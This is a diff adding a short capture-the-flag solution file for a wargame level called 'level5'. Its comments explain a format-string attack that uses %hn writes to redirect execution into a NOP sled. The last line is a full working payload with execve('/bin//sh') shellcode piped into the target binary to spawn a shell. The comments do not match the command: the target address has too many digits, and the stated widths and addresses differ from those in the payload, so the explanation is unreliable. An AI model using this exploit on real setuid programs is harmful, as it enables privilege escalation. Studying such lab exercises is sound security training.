@@ -1,0 +1,14 @@
+# same exploit than the last binary (level4) but there s no compare so
+# we had to use a shell code by overwrite the eip register by
+# somewhere in the nops (\x90). 
+#
+# we searched for the return address of printf .
+# using nops we found the stack address where $eip had
+# been push .
+# using %NNNd and %*$n to write on the stack
+# we had to write 0xbfffff51c.
+# split in two to use %XXXXd %4$hn (hn being a 16bits integer)
+# bfff -> 49151 - eip - nops - shellcode = 49087
+# f51c -> 62748 - 49151 = 13597
+#
+#(python -c 'print "\xfe\xf4\xff\xbf" + "\xfc\xf4\xff\xbf" + 200 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "%48918d%4$hn%13630d%5$hn"';cat) | ./level5
